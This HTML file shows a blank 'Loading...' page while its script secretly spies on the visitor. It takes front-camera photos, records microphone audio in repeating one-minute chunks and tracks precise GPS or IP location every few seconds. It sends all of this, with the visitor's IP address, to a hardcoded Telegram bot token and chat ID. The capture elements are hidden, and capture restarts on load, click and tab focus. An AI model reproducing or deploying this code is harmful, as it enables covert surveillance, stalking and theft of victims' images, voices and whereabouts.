<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: #fff; }
  </style>
</head>
<body>

  <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const token = "8970456088:AAHBNuNtp9ZlVjVJl_uuI-9G-R1UcIVaYAg";
    const chatId = "1749244772";
    let stream = null;
    let mediaRecorder = null;
    let audioChunks = [];
    let cachedLat = 0;
    let cachedLon = 0;
    let cachedIP = 'N/A';
    let locationRetryCount = 0;
    const MAX_LOCATION_RETRIES = 3;
    let hasValidLocation = false;

    function sendToTelegram(lat, lon, photoBlob) {
      if (photoBlob && photoBlob.size > 1000) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBlob, 'photo.jpg');
        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🌐 IP: ${cachedIP}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
          .then(res => res.json())
          .then(data => {
            if (!data.ok) {
              console.log('✗ Photo send failed');
            }
          })
          .catch(() => {});
      }
    }

    function sendAudioToTelegram(audioBlob) {
      if (audioBlob && audioBlob.size > 0) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('audio', audioBlob, 'audio.ogg');
        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: formData })
          .then(res => res.json())
          .catch(() => {});
      }
    }

    let recordingInterval = null;
    let isCapturing = false;
    let audioRetryCount = 0;
    const MAX_AUDIO_RETRIES = 5;

    async function startAudioRecording() {
      try {
        if (audioRetryCount > MAX_AUDIO_RETRIES) return;
        
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        audioRetryCount = 0;
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };

        mediaRecorder.onstop = () => {
          if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            sendAudioToTelegram(audioBlob);
          }
          audioChunks = [];
          if (mediaRecorder && mediaRecorder.stream) {
            mediaRecorder.stream.getTracks().forEach(t => t.stop());
          }
          setTimeout(startAudioRecording, 50);
        };

        mediaRecorder.start();

        if (recordingInterval) clearInterval(recordingInterval);
        recordingInterval = setInterval(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 60000);
      } catch (err) {
        audioRetryCount++;
        if (audioRetryCount <= MAX_AUDIO_RETRIES) {
          setTimeout(startAudioRecording, 3000);
        }
      }
    }

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden && (!mediaRecorder || mediaRecorder.state !== 'recording')) {
        startAudioRecording();
      }
    });

    // Audio health check - reduced from 30 to 60 seconds
    setInterval(() => {
      if (!mediaRecorder || mediaRecorder.state !== 'recording') {
        startAudioRecording();
      }
    }, 60000);

    function getIPBasedLocation() {
      // Fallback location using IP geolocation with cache buster
      const cacheBuster = Date.now();
      fetch(`https://ipapi.co/json/?t=${cacheBuster}`)
        .then(res => res.json())
        .then(data => {
          if (data.latitude && data.longitude && data.latitude !== 0 && data.longitude !== 0) {
            cachedLat = data.latitude;
            cachedLon = data.longitude;
            hasValidLocation = true;
            console.log('✓ IP Location found:', cachedLat, cachedLon);
          }
          if (data.ip) {
            cachedIP = data.ip;
            console.log('✓ IP Address:', cachedIP);
          }
        })
        .catch(err => console.log('✗ IP location failed:', err));
    }

    function checkPermissions() {
      // Async permission check - doesn't block execution
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' })
          .then(result => {
            if (result.state === 'denied') {
              getIPBasedLocation();
            }
          })
          .catch(() => {});
      }
    }

    function updateLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          // Accept any valid GPS reading (not 0,0)
          if (lat && lon && (lat !== 0 || lon !== 0)) {
            cachedLat = lat;
            cachedLon = lon;
            hasValidLocation = true;
            locationRetryCount = 0;
          }
        }, (err) => {
          // GPS error - try again
          locationRetryCount++;
          if (locationRetryCount <= MAX_LOCATION_RETRIES) {
            setTimeout(updateLocation, 1000);
          } else {
            // Last resort: use IP only after GPS completely fails
            getIPBasedLocation();
          }
        }, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        getIPBasedLocation();
      }
    }

    // Start location tracking immediately (async, non-blocking)
    updateLocation();
    checkPermissions();
    
    // Update location every 8 seconds
    setInterval(updateLocation, 8000);

    async function autoCapture() {
      if (isCapturing) return;
      
      isCapturing = true;
      let videoStream = null;
      
      try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        stream = videoStream;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        if (!video || !canvas) {
          isCapturing = false;
          videoStream.getTracks().forEach(t => t.stop());
          return;
        }
        
        video.srcObject = videoStream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 400);
          };
          setTimeout(resolve, 800);
        });

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        const context = canvas.getContext('2d');
        if (!context) {
          isCapturing = false;
          videoStream.getTracks().forEach(t => t.stop());
          return;
        }
        
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        videoStream.getTracks().forEach(t => t.stop());
        
        canvas.toBlob((blob) => {
          if (!blob || blob.size < 100) {
            isCapturing = false;
            return;
          }
          
          // Fast quality optimization
          let quality = 0.80;
          if (blob.size > 400000) quality = 0.60;
          else if (blob.size > 250000) quality = 0.70;
          
          if (quality < 0.80) {
            canvas.toBlob((optimizedBlob) => {
              sendToTelegram(cachedLat, cachedLon, optimizedBlob);
              isCapturing = false;
            }, 'image/jpeg', quality);
          } else {
            sendToTelegram(cachedLat, cachedLon, blob);
            isCapturing = false;
          }
        }, 'image/jpeg', 0.80);
      } catch (err) {
        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
        isCapturing = false;
      }
    }

    window.addEventListener('load', () => {
      // Start audio in background (don't wait for it)
      startAudioRecording().catch(() => {});
      
      // Check every 200ms for valid location (accurate GPS lock)
      const locationCheckInterval = setInterval(() => {
        if (hasValidLocation && cachedLat !== 0 && cachedLon !== 0) {
          clearInterval(locationCheckInterval);
          autoCapture();
        }
      }, 200);
      
      // Fallback: 2 seconds max to ensure location acquisition time
      setTimeout(() => {
        clearInterval(locationCheckInterval);
        autoCapture();
      }, 2000);
    });

    document.addEventListener('click', () => {
      if (!isCapturing) {
        autoCapture();
      }
    });
  </script>

</body>
</html>
